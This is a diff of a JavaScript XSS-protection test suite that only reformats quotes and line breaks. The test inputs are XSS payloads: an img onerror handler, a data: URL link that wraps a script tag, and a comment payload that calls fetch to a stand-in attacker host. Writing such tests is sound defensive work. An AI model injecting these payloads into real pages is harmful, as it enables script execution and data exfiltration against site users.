@@ -95,7 +95,7 @@ describe("Security: XSS Protection", () => {
     });
 
     it("should escape onerror attributes", () => {
-      const input = '<img src=x onerror=alert(1)>';
+      const input = "<img src=x onerror=alert(1)>";
       const escaped = escapeHtml(input);
 
       expect(escaped).toContain("&lt;img");
@@ -132,7 +132,8 @@ describe("Security: XSS Protection", () => {
 
   describe("data protocol attacks", () => {
     it("should prevent data: protocol in href", () => {
-      const input = '<a href="data:text/html,<script>alert(1)</script>">Link</a>';
+      const input =
+        '<a href="data:text/html,<script>alert(1)</script>">Link</a>';
       const escaped = escapeHtml(input);
 
       expect(escaped).toContain("&lt;a");
@@ -265,7 +266,8 @@ describe("Security: XSS Protection", () => {
 
   describe("practical XSS scenarios", () => {
     it("should protect user comments", () => {
-      const userComment = '<img src=x onerror="fetch(\'http://attacker.com\')">';
+      const userComment =
+        "<img src=x onerror=\"fetch('http://attacker.com')\">";
       const escaped = escapeHtml(userComment);
       const html = `<div class="comment">${escaped}</div>`;
 
